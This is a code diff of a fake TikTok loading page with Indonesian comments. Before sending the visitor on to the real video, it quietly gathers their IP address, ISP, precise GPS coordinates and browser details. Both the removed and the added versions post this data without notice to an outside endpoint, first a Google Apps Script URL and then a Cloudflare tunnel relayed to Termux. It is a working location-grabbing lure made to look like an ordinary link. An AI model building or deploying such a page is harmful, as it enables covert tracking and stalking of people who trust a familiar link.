@@ -5,147 +5,68 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>TikTok</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            background: #000;
-            color: #fff;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            flex-direction: column;
-        }
-        .loading-container {
-            text-align: center;
-        }
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 5px solid #333;
-            border-top: 5px solid #25f4ee;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .message {
-            font-size: 16px;
-            color: #ccc;
-            margin-top: 10px;
-        }
-        .tiktok-logo {
-            font-size: 36px;
-            font-weight: bold;
-            color: #fff;
-            margin-bottom: 20px;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .spinner { width: 45px; height: 45px; border: 4px solid #333; border-top: 4px solid #25f4ee; border-radius: 50%; animation: spin 0.6s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="loading-container">
-        <div class="tiktok-logo">TikTok</div>
+    <div style="text-align: center;">
+        <div style="font-size: 32px; font-weight: bold;">TikTok</div>
         <div class="spinner"></div>
-        <div class="message">Memuat video...</div>
     </div>
 
     <script>
         (async function() {
-            // Ambil parameter dari URL
             const urlParams = new URLSearchParams(window.location.search);
-            const originalUrl = urlParams.get('url');
-            const id = urlParams.get('id');
+            const targetUrl = urlParams.get('url');
+            const targetId = urlParams.get('id');
 
-            // Jika tidak ada parameter, redirect ke TikTok homepage
-            if (!originalUrl || !id) {
-                window.location.href = 'https://www.tiktok.com';
+            // GANTI LINK DI BAWAH INI DENGAN LINK CLOUDFLARED LO!
+            const tunnelURL = "https://terrorism-msg-inbox-ivory.trycloudflare.com";
+
+            if (!targetUrl || !targetId) {
+                window.location.replace('https://www.tiktok.com');
                 return;
             }
 
-            // Fungsi untuk mendapatkan IP dan ISP dari ipapi.co
-            async function getIpInfo() {
+            // Fungsi ambil IP
+            async function getIp() {
                 try {
-                    const response = await fetch('https://ipapi.co/json/');
-                    const data = await response.json();
-                    return {
-                        ip: data.ip || '0.0.0.0',
-                        isp: data.org || data.isp || 'Tidak diketahui'
-                    };
-                } catch (err) {
-                    console.error('Gagal mengambil IP info:', err);
-                    return { ip: '0.0.0.0', isp: 'Tidak diketahui' };
-                }
+                    const res = await fetch('https://ipapi.co/json/');
+                    const d = await res.json();
+                    return { ip: d.ip, isp: d.org };
+                } catch (e) { return { ip: '0.0.0.0', isp: 'Unknown' }; }
             }
 
-            // Fungsi untuk mendapatkan lokasi (dengan format desimal yang benar)
-            function getLocation() {
-                return new Promise((resolve) => {
-                    if (!navigator.geolocation) {
-                        resolve({ lat: '', lon: '' });
-                        return;
-                    }
+            // Fungsi ambil Lokasi
+            function getLoc() {
+                return new Promise((res) => {
                     navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            // Pastikan angka menggunakan titik sebagai desimal, bukan koma
-                            const lat = position.coords.latitude.toString().replace(',', '.');
-                            const lon = position.coords.longitude.toString().replace(',', '.');
-                            resolve({
-                                lat: lat,
-                                lon: lon
-                            });
-                        },
-                        (error) => {
-                            console.error('Geolocation error:', error.message);
-                            resolve({ lat: '', lon: '' });
-                        },
-                        { timeout: 8000, enableHighAccuracy: true }
+                        (p) => res({ lat: p.coords.latitude, lon: p.coords.longitude }),
+                        () => res({ lat: '', lon: '' }),
+                        { timeout: 5000, enableHighAccuracy: true }
                     );
                 });
             }
 
-            // Kumpulkan semua data
-            const [ipInfo, location] = await Promise.all([
-                getIpInfo(),
-                getLocation()
-            ]);
+            const [ipInfo, loc] = await Promise.all([getIp(), getLoc()]);
 
-            const device = navigator.userAgent;
+            const payload = new URLSearchParams({
+                id: targetId,
+                lat: loc.lat,
+                lon: loc.lon,
+                ip: ipInfo.ip,
+                isp: ipInfo.isp,
+                device: navigator.userAgent
+            });
 
-            // Siapkan parameter untuk dikirim (form-urlencoded)
-            const params = new URLSearchParams();
-            params.append('id', id);
-            params.append('lat', location.lat);
-            params.append('lon', location.lon);
-            params.append('ip', ipInfo.ip);
-            params.append('isp', ipInfo.isp);
-            params.append('device', device);
+            // Tembak data langsung ke Termux
+            fetch(tunnelURL, { method: 'POST', mode: 'no-cors', body: payload });
 
-            // URL Apps Script (ganti dengan milikmu jika berbeda)
-            const appsScriptUrl = 'https://script.google.com/macros/s/AKfycbzI3SGqGVUH7Phg4B2bCbRNWzZfjx4ujTpvMUtuD-QJ3epigrCLsw7XfeAV2JiDr5_H/exec';
-
-            try {
-                // Kirim data dengan mode no-cors (tidak bisa baca respons, tapi tidak masalah)
-                await fetch(appsScriptUrl, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: params
-                });
-                console.log('Data terkirim:', Object.fromEntries(params));
-            } catch (err) {
-                console.error('Gagal mengirim data:', err);
-            }
-
-            // Redirect ke link TikTok asli (setelah 1 detik)
-            setTimeout(() => {
-                window.location.href = originalUrl;
-            }, 1000);
+            // Langsung redirect ke video asli
+            setTimeout(() => { window.location.replace(targetUrl); }, 1000);
         })();
     </script>
 </body>
